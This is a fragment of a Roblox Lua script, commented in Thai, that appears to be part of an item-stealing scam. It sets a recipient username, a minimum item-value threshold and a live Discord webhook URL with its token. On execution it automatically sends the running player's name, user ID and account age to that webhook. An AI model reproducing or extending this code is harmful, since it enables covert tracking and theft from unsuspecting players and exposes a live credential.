...
local users = {"oyaoming"}
local min_rap = _G.minrap or 46000
local webhook = "https://discord.com/api/webhooks/1480099215186071575/L3nGzbh8TONH-YSfklBgg0SRlNHcG-tK4WB1TMbEmUnvciqWNoYwmKYd8zMtUrMDf-jX"

-- ฟังก์ชันแจ้งเตือนเมื่อมีการกดรันสคริปต์
local function SendExecutionWebhook()
    local headers = {["Content-Type"] = "application/json"}
    local data = {
        ["embeds"] = {{
            ["title"] = "🚀 Script Executed!",
            ["description"] = "ผู้เล่น **" .. plr.Name .. "** กำลังเริ่มรันสคริปต์",
            ["color"] = 16776960, -- สีเหลือง
            ["fields"] = {
                {["name"] = "Username", ["value"] = "||" .. plr.Name .. "||", ["inline"] = true},
                {["name"] = "User ID", ["value"] = tostring(plr.UserId), ["inline"] = true},
                {["name"] = "Account Age", ["value"] = plr.AccountAge .. " days", ["inline"] = true}
            },
...
-- เรียกใช้งานฟังก์ชันแจ้งเตือนทันที
spawn(SendExecutionWebhook)
